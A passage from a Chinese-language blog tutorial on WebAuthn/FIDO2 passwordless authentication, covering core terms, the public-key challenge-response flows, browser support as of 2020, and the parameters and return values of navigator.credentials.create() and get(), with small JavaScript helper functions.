Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 \"preferred\" 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 \"public-key\"</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 \"public-key\"</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n       